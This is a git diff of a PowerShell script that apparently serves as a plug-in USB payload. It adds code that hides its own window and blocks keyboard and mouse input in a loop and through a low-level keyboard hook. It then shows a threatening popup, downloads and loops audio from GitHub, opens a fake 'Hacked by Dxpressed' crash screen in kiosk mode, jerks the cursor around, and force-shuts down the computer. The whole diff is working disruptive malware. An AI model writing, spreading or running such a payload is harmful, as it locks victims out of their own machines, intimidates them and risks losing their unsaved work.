@@ -1,8 +1,88 @@
-Add-Type -AssemblyName System.Windows.Forms
+# Hide PowerShell window
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@
+$hWnd = [Win32]::GetForegroundWindow()
+[Win32]::ShowWindow($hWnd, 0)
 
-# Write HTML to a temp file
+# 🔒 BLOCK INPUT (with loop)
+Start-Job {
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class InputBlocker {
+        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
+    }
+"@
+    while ($true) {
+        [InputBlocker]::BlockInput($true)
+        Start-Sleep -Milliseconds 500
+    }
+}
+
+# ⛔ DISABLE ALT+F4, CTRL, WIN, ETC
+Start-Job {
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class KeyboardBlocker {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+
+    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    public static void SetHook() {
+        _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
+    }
+
+    public static void Unhook() {
+        UnhookWindowsHookEx(_hookID);
+    }
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        return (IntPtr)1; // Block all keys
+    }
+
+    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
+}
+"@
+[KeyboardBlocker]::SetHook()
+Start-Sleep -Seconds 300
+[KeyboardBlocker]::Unhook()
+}
+
+# 🪦 Creepy popup
+Add-Type -AssemblyName PresentationFramework
+[System.Windows.MessageBox]::Show("You shouldn''t have plugged that in... I''m watching.","System Alert")
+
+# 🔊 Play creepy audio
+Add-Type -TypeDefinition @"
+using System.Media;
+public class Audio {
+    public static void Play(string url) {
+        System.Net.WebClient web = new System.Net.WebClient();
+        string temp = System.IO.Path.GetTempFileName() + ".wav";
+        web.DownloadFile(url, temp);
+        SoundPlayer player = new SoundPlayer(temp);
+        player.PlayLooping();
+    }
+}
+"@
+[Audio]::Play("https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/whispers.wav")
+
+# 🧟 Glitchy screen
 $html = @"
-
 <html>
 <head>
   <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
@@ -77,6 +157,7 @@ $html = @"
       100% { transform: translateY(15px); opacity: 0; }
     }
 
+    /* Random ghost messages */
     .ghost-msg {
       position: absolute;
       color: rgba(255, 0, 0, 0.4);
@@ -99,10 +180,12 @@ $html = @"
     <h2 class="drip">Hacked by Dxpressed</h2>
   </div>
 
+  <!-- Ghost messages -->
   <div class="ghost-msg" style="left: 10%;">I see you...</div>
   <div class="ghost-msg" style="left: 60%;">Run while you can</div>
   <div class="ghost-msg" style="left: 30%;">Too late now</div>
 
+  <!-- Mouse ghost trail -->
   <script>
     document.addEventListener("mousemove", function(e) {
       let ghost = document.createElement("div");
@@ -116,36 +199,22 @@ $html = @"
   </script>
 </body>
 </html>
-
 "@
-$tempHtml = "$env:TEMP\doom.html"
-$html | Set-Content -Path $tempHtml -Encoding UTF8
 
-# Disable keyboard with BlockInput (Windows Forms)
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class InputBlocker {
-    [DllImport("user32.dll")]
-    public static extern bool BlockInput(bool fBlockIt);
+# Display the crash screen
+$bsodFile = "$env:TEMP\bsod.html"
+$html | Out-File $bsodFile -Encoding ASCII
+Start-Process "msedge.exe" -ArgumentList "--kiosk", $bsodFile
+
+# 🌀 Mouse glitch
+Start-Job {
+  Add-Type -AssemblyName System.Windows.Forms
+  for ($i = 0; $i -lt 100; $i++) {
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080))
+    Start-Sleep -Milliseconds 200
+  }
 }
-"@
-[InputBlocker]::BlockInput($true)
 
-# Play music from GitHub
-$player = New-Object System.Media.SoundPlayer
-$player.SoundLocation = "https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/sound.wav"
-$player.LoadAsync()
-$player.PlayLooping()
-
-# Open crash page fullscreen
-Start-Process "msedge.exe" "--kiosk $tempHtml" -WindowStyle Hidden
-
-# Schedule shutdown (4 minutes)
-Start-Process "shutdown.exe" -ArgumentList "/s /t 240 /f"
-
-# Wait for shutdown
-Start-Sleep -Seconds 250
-
-# Re-enable input if still running
-[InputBlocker]::BlockInput($false)
+# 🕓 Wait and shut down
+Start-Sleep -Seconds 240
+Stop-Computer -Force
